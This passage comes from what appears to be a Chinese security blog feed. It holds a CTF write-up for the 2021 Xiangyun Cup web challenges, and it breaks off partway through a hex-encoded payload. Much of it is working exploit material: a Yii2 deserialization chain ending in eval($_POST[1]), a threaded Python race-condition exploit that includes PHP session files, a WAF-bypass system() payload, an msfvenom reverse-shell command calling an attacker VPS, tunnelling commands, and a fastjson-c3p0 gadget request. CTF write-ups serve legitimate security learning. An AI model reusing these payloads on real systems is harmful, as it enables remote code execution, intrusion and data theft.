href="https://github.com/udoless/apache-log4j-rce-poc">https://github.com/udoless/apache-log4j-rce-poc</a></p><p>转载请注明本文作者和地址</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021祥云杯</title>
      <link href="article/2021xyb/"/>
      <url>article/2021xyb/</url>
      
        <content type="html"><![CDATA[<p>记录一下，祥云杯的wp</p><span id="more"></span><p>个人的最好成绩，web差一题ak了，当然题目也很简单就是啦。我主要是负责web方面的解题，队伍的wp也会在下面放出。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h3><p>题目打开写的很清楚，较新的链子，看了下是<a href="https://xz.aliyun.com/t/9948">yii2.0.42的1day漏洞</a></p><img src="/article/2021xyb/image-20210903132707299.png" class="" title="image-20210903132707299" loading="lazy"><p>原理不过多分析了，学弟在赛后写了个<a href="https://lxscloud.top/2021/08/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%9E%84%E9%80%A0POP%E9%93%BE/">分析</a>挺详细的，可以看看（学弟tql）</p><p>Exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>AppendStream</span><span class="token punctuation">;</span>    <span class="token keyword">class</span>  <span class="token class-name-definition class-name">RunProcess</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$output</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AppendStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">output</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jiang'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultGenerator</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$default</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default</span> <span class="token operator">=</span> <span class="token variable">$default</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">AppendStream</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$streams</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$seekable</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">streams</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CachingStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">CachingStream</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$remoteStream</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">remoteStream</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">stream</span><span class="token operator">=</span><span class="token keyword">new</span>  <span class="token class-name">PumpStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">PumpStream</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$source</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$buffer</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">buffer</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'j'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"closure/autoload.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//            $a = function()&#123;phpinfo();&#125;;</span>            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function"><span class="token punctuation">\</span>Opis<span class="token punctuation">\</span>Closure<span class="token punctuation">\</span>serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>直接可以命令执行</p><img src="/article/2021xyb/image.png" class="" title="image" loading="lazy"><p>直接拿flag</p><hr><h3 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h3><p><small>这题是完全是个人凭感觉自己做出来的，很欣慰，可惜没抢到血分</small></p><p>界面很花哨，随便登陆即可</p><p>看一下登陆的包</p><p>要跟随一个302跳转才能进去，检测网址过滤了file、flag关键字。</p><p>输入网址发现进了check2.php，根据报错得知是<code>file_get_contents($_POST[&#39;url1&#39;]);</code>这样的形式根据扫目录得到的结果，存在admin目录</p><p>直接访问会被403，所以利用检测网站打ssrf，检测然后预览看，打<code>http://127.0.0.1/admin/</code>，可以发现开启了目录遍历</p><img src="/article/2021xyb/image-20210903134546557.png" class="" title="image-20210903134546557" loading="lazy"><p>发现目录下有<code>include123.php</code>文件，读取得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$u</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"|file_put_content|file_get_content|fwrite|curl|system|eval|assert"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token operator">.=</span><span class="token string double-quoted-string">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token operator">.=</span><span class="token string double-quoted-string">"|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token operator">.=</span><span class="token string double-quoted-string">"|file|dict|gopher"</span><span class="token punctuation">;</span><span class="token comment">//累了累了，饮茶先</span><span class="token variable">$vpattern</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span><span class="token variable">$pattern</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$vpattern</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$vpattern</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$value</span></span>/i"</span><span class="token punctuation">,</span> <span class="token variable">$u</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"检测到恶意字符"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>出题人真的苟，这么长一段黑名单，审查源码，可以读<code>/etc/passwd</code> 。但是ban了很多函数看上去根本不是想给机会rce。</p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>仔细观察发现</p><p> 1.文件包含include </p><p> 2.u变量可控 </p><p> 3.可以任意文件读取使用了session，所以默认<code>/tmp/sess_id</code> 会存有session的信息，读取id对应的session发现存在</p><p>于是想到<code>PHP_SESSION_UPLOAD_PROGRESS漏洞</code></p><blockquote><p>php的session.use_strict_mode默认值为0，此时用户是可以自己定义Session ID的。<br>比如，我们在Cookie里设置PHPSESSID&#x3D;flag，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_flag（还有可能在 &#x2F;var&#x2F;lib&#x2F;php&#x2F;session里面）。即使此时用户没有初始化Session，PHP也会自动初始化Session。<br>产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p><p>如果我们在其中插入一句话木马，它就会被写入sess_xxx里</p><img src="/article/2021xyb/image-20210903135456923.png" class="" title="image-20210903135456923" loading="lazy"><p>但是默认情况下，session.upload_progress.cleanup是开启的，一旦读取了所有POST数据，它就会清除进度信息，那就没用了，他读取完了会清除数据，那我们的代码就执行不了。</p><p>所以需要使用条件竞争，要赶在他还没有读取完post包上传的数据的时候就访问到这个sess_xxx文件，执行里面的代码。</p></blockquote><p>直接从网上找exp修改，目的就是对个网页<code>check2.php</code>进行上传，这里填充了一堆<code>a</code>，让它去占用时间给我们条件竞争创造更多机会，利用ssrf打<code>include123.php</code>，参数<code>u</code>包含session文件来命令执行</p><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 8月 21, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> io<span class="token keyword">import</span> threadingbaseurl <span class="token operator">=</span> <span class="token string">"http://eci-2zefgf3p1ushlimyl69v.cloudeci1.ichunqiu.com/"</span>sessid <span class="token operator">=</span> <span class="token string">'gyy'</span>PAYLOAD <span class="token operator">=</span> <span class="token string">'&lt;?php eval(system(\'sh /getflag.sh\'));?>'</span><span class="token keyword">def</span> <span class="token function">getdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"url1"</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1/admin/include123.php?u=/tmp/sess_"</span> <span class="token operator">+</span> sessid<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># cookies = "PHPSESSID=123".split("; ")</span>    <span class="token comment"># cookie = &#123;&#125;</span>    <span class="token comment"># for i in cookies:</span>    <span class="token comment">#     cookie[i.split("=")[0]] = i.split("=")[1]</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>baseurl <span class="token operator">+</span> <span class="token string">"check2.php"</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>    text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseurl <span class="token operator">+</span> <span class="token string">"preview.php"</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>    <span class="token keyword">return</span> text<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>baseurl <span class="token operator">+</span> <span class="token string">"check2.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> PAYLOAD<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'123.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>                            timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> getdir<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'123.txt'</span> <span class="token keyword">in</span> resp<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>            event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+++++++++++++]retry"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>打了phpinfo发现可行</p><img src="/article/2021xyb/upload_22a92f54497d73c2f65e6f34c6dba9b6.png" class="" title="img" loading="lazy"><p>继续</p><img src="/article/2021xyb/upload_00c55368090301064d2ed35507ff9685.png" class="" title="img" loading="lazy"><p>读取根目录下文件</p><img src="/article/2021xyb/upload_4e9b7ae5eef86856696a48d5cceda801.png" class="" title="img" loading="lazy"><p>执行<code>/getflag.sh</code></p><img src="/article/2021xyb/image-20210903140536843.png" class="" title="image-20210903140536843" loading="lazy"><p>拿到flag</p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>赛后和 @h3h3QAQ 师傅聊了下，发现waf是可以绕过的（tqltql）</p><p>直接用反斜线绕过,payload:<code>./?u=&lt;?=system(&#39;gerf\lag.sh&#39;);?&gt;</code></p><img src="/article/2021xyb/image-20210903140902197.png" class="" title="image-20210903140902197" loading="lazy"><p>然后预览得到flag</p><img src="/article/2021xyb/image-20210903141054059.png" class="" title="image-20210903141054059" loading="lazy"><p>太猛了</p><hr><h3 id="层层穿透"><a href="#层层穿透" class="headerlink" title="层层穿透"></a>层层穿透</h3><p>Apache Flink老洞了<a href="https://www.freebuf.com/vuls/220252.html">https://www.freebuf.com/vuls/220252.html</a></p><p>利用msf生成个jar包</p><p><code> msfvenom -p java/shell_reverse_tcp LHOST=vps LPORT=1234 -f jar&gt;/media/psf/Home/Downloads/shell.jar</code></p><p>直接upload然后submit上线</p><p>题目说本机对应内网<code>10.10.1.12</code>，扫了<code>10.10.1.11</code> 的8080端口好像有东西</p><h4 id="利用ew内网穿透"><a href="#利用ew内网穿透" class="headerlink" title="利用ew内网穿透"></a>利用ew内网穿透</h4><p>利用ew内网穿透出来，放公网服务器，在靶机上用curl -O保存ew文件，然后执行，公网vps上转发流量</p><p>本人的描述可能有错误或不清楚的地方，还请师傅们多多指教</p><h5 id="公网主机"><a href="#公网主机" class="headerlink" title="公网主机"></a>公网主机</h5><p>如下，执行<code>./ew -s lcx_listen -l 1080 -e 8888</code> 将本机1080的流量转交到8888</p><img src="/article/2021xyb/image-20210903141554948.png" class="" title="image-20210903141554948" loading="lazy"><hr><h5 id="边界主机"><a href="#边界主机" class="headerlink" title="边界主机"></a>边界主机</h5><p>执行<code>./ew -s lcx_slave -d [vps] -e [port] -f 10.10.1.11 -g 8080</code></p><p>利用可控的内网主机打通<code>10.10.1.11:8080</code> 与我们公网vps的通讯隧道</p><img src="/article/2021xyb/image-20210903142010256.png" class="" title="image-20210903142010256" loading="lazy"><h4 id="网络状况描述"><a href="#网络状况描述" class="headerlink" title="网络状况描述"></a>网络状况描述</h4><p>· 本机：即我的攻击电脑</p><p>· 可控的公网IP主机：即我的在公网的服务器</p><p>· A主机：题目给出的靶机，有公网IP：47.104.135.101，内网IP：10.10.1.12，可访问B主机</p><p>· B主机：题目内网的目标靶机，8080端口有东西</p><p>目标：访问B主机的8080端口</p><pre class="language-none"><code class="language-none">                    一台可控公网IP主机                    可控内网主机A                      主机B+---------+     +----------------------+    |    +-------------------------+      +-------------------+|   本机   | -&gt;&gt; | 1080 -&gt;  vps -&gt; 8888 |  防火墙  | &lt;--    10.10.1.12   --&gt; | -&gt;&gt; | 8080 -&gt; 10.10.1.11 |+---------+     +----------------------+    |    +-------------------------+      +-------------------+</code></pre><hr><p>访问到了<code>10.10.1.11:8080</code></p><p>将题目附件的<code>web.jar</code> 反编译下，拿到了源码。</p><p>首先在<code>/doLogin</code> 路由登陆，审查源码得知 <code>用户名/密码</code> 分别为 <code>admin/123456</code> </p><p>然后拿到cookie转去<code>/admin/test</code>路由</p><p>根据源码，这里会先过waf然后解析json，而且json长度要大于20000</p><p>在github上找到了一份payload：<a href="https://github.com/depycode/fastjson-c3p0">https://github.com/depycode/fastjson-c3p0</a></p><p>fastjson-c3p0不出网回显利用，直接生成payload，然后复制几遍达到长度要求，改Content-Type为json，在header中添加cmd命令，获得flag</p><img src="/article/2021xyb/4D49F7AE6BBF284F438626001021582E.jpg" class="" title="4D49F7AE6BBF284F438626001021582E" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">POST &#x2F;admin&#x2F;test HTTP&#x2F;1.1Host: 49.234.89.193:1080Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: closeCookie: JSESSIONID&#x3D;20337391D87A73966C86012AB6114638;Content-Type: application&#x2F;jsoncmd: cat &#x2F;flagContent-Length: 79583&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870707400136765744F757470757450726F7065727469657370737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017371007E000B3F4000000000000C770800000010000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E00084C00055F6E616D6571007E00074C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000DCFCAFEBABE0000003400CD0A0014005F090033006009003300610700620A0004005F09003300630A006400650A003300660A000400670A000400680A0033006907006A0A0014006B0A0012006C08006D0B000C006E08006F0700700A001200710700720A007300740700750700760700770800780A0079007A0A0018007B08007C0A0018007D08007E08007F0800800B001600810700820A008300840A008300850A008600870A002200880800890A0022008A0A0022008B0A008C008D0A008C008E0A0012008F0A009000910A009000920A001200930A003300940700950A00120096070097010001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A6176612F7574696C2F486173685365743C4C6A6176612F6C616E672F4F626A6563743B3E3B010001720100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100204C79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F313B01000169010015284C6A6176612F6C616E672F4F626A6563743B295A0100036F626A0100124C6A6176612F6C616E672F4F626A6563743B01000D537461636B4D61705461626C65010016284C6A6176612F6C616E672F4F626A6563743B492956010001650100154C6A6176612F6C616E672F457863657074696F6E3B010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B0100016F01000564657074680100014907007607004C070072010001460100017101000D6465636C617265644669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000573746172740100016E0100114C6A6176612F6C616E672F436C6173733B07007007009807009901000A536F7572636546696C65010010436F6D6D6F6E4563686F312E6A6176610C003C003D0C003800390C003A003B0100116A6176612F7574696C2F486173685365740C0034003507009A0C009B009C0C005300480C009D00440C009E00440C004300440100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740C009F00A00C00A100A2010003636D640C00A300A401000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C00A500A60100106A6176612F6C616E672F4F626A6563740700A70C00A800A90100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696F6E0100106A6176612F6C616E672F537472696E670100076F732E6E616D650700AA0C00AB00A40C00AC00AD01000357494E0C009D00AE0100022F630100072F62696E2F73680100022D630C00AF00B00100116A6176612F7574696C2F5363616E6E65720700B10C00B200B30C00B400B50700B60C00B700B80C003C00B90100025C410C00BA00BB0C00BC00AD0700BD0C00BE00BF0C00C0003D0C00C100C20700990C00C300C40C00C500C60C00C700C80C003A00480100135B4C6A6176612F6C616E672F4F626A6563743B0C00C900A001001E79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F3101001A5B4C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010008636F6E7461696E73010003616464010008676574436C617373010013282